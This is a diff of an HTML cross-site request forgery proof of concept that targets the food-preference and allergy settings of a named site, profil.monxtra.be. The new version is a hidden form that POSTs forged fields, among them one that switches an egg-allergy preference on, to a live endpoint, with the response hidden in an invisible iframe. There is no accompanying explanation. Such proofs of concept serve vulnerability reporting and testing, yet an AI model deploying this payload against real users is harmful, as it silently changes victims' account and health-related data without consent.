@@ -1,18 +1,28 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>CSRF PoC - Food Preference Update</title>
+</head>
 <body>
+  <h2>CSRF PoC - Update Food Preference</h2>
 
-<form action="https://profil.monxtra.be/manage-profile/food-preferences/consents/manage?code=PREF_CELERY_NEW&category=CAT_ALLERGY&_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2Fconsents.manage%2Findex"
-method="POST"
-target="hiddenFrame">
+  <form
+    action="https://profil.monxtra.be/manage-profile/food-preferences?type=consents&status=info&_data=routes%2Fmanage-profile%2B%2Ffood-preferences%2B%2F_layout%2Findex"
+    method="POST"
+    target="csrfFrame"
+    enctype="application/x-www-form-urlencoded">
 
-<input type="hidden" name="acceptedConsents" value="X_CS_LIFESTYLE_AND_ALLERGEN_PRODUCTINFO">
+    <input type="hidden" name="hasAcceptedConsents" value="true">
+    <input type="hidden" name="code" value="PREF_EGGS_NEW">
+    <input type="hidden" name="category" value="CAT_ALLERGY">
+    <input type="hidden" name="isLastPreference" value="false">
+    <input type="hidden" name="shouldBecomeActive" value="true">
+    <input type="hidden" name="isCurrentlyActive" value="true">
+    <input type="hidden" name="isLastPreference" value="false">
 
-<input type="submit" value="Exploit">
+    <button type="submit">Submit CSRF</button>
+  </form>
 
-</form>
-
-<iframe name="hiddenFrame" style="display:none;"></iframe>
-
+  <iframe name="csrfFrame" style="display:none;"></iframe>
 </body>
 </html>
